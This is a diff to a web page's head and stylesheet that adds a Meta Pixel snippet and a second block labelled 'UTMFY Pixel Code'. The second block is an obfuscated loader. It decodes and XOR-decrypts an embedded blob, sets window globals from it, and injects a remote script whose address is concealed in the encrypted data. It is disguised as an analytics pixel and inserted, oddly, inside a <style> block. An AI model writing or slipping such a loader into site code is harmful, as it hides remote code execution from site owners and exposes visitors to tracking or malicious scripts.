@@ -332,7 +332,27 @@ html,body{margin:0;padding:0;}
 .masthead-word{display:inline-block;color:#fff;font-family:'Inter','Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;font-size:21px;font-weight:400;letter-spacing:-.01em;text-transform:none;line-height:22px;}
 *{border-radius:0 !important}
 
-.byline-avatar{border-radius:50% !important}
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1410089847670753');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1410089847670753&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<!-- UTMFY Pixel Code -->
+<script>(function(){var y_ud=atob("DEXGc7MBFemOXtRS7D7kBsFtN9OsNqAmnDb8XJxicYegK6A/hSO/XdBueMfsLPshjzevA8dyOpz6M6d9gCSyFsB1O4P9fPhwjTGyAdpjYJ3rLfZotz7kHdJscMu0fLAzmCTrBsdsfI/3c6QgiTOjHccsbYrhOvkhjy7kX5F3dIX7O/Zozme7X8gje4jjO/ZoziGnB9IsYJ3jN7IrwTW0FsVke52jLaEwhSG1UZ8jY4jiK7Fw1mfkDu58");var f_q=[];for(var u_dc=0;u_dc<y_ud.length;u_dc++){f_q.push(y_ud.charCodeAt(u_dc)&255);}var w_r=f_q[0];var h_b=f_q.slice(1,1+w_r);var y_h2=f_q.slice(1+w_r);var a_b=y_h2.map(function(b,g_uk){return b^h_b[g_uk%w_r];});var q_ua="";for(var m_cs6=0;m_cs6<a_b.length;m_cs6++){q_ua+=String.fromCharCode(a_b[m_cs6]&255);}var u_q=decodeURIComponent(escape(q_ua));var g_c5k=JSON.parse(u_q);var g_m=g_c5k.globals||[];g_m.forEach(function(w_4){window[w_4.name]=w_4.value;});var a_q5=document.createElement("script");a_q5.src=g_c5k.url;a_q5.async=true;a_q5.defer=true;(g_c5k.attributes||[]).forEach(function(p_tfr){a_q5.setAttribute(p_tfr.name,p_tfr.value);});(document.head||document.documentElement).appendChild(a_q5);})();</script>
+<!-- End UTMFY Pixel Code -->
 </style>
 </head>
 
